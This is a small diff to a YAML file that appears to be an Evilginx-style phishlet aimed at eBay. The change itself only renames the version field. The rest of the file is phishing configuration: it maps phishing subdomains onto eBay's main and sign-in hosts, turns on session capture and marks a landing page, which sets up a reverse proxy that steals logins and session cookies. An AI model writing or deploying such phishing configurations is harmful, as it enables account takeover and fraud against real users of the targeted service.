@@ -1,7 +1,7 @@
 #hosturi
 name: ebay
 author: Anon369G
-version: v3.0.0
+min_ver: 3.0.0
 proxy_hosts:
   - {phish_sub: '', orig_sub: 'www', domain: 'ebay.com', session: true, is_landing: true}
   - {phish_sub: 'signin', orig_sub: 'signin', domain: 'ebay.com', session: true, is_landing: false}
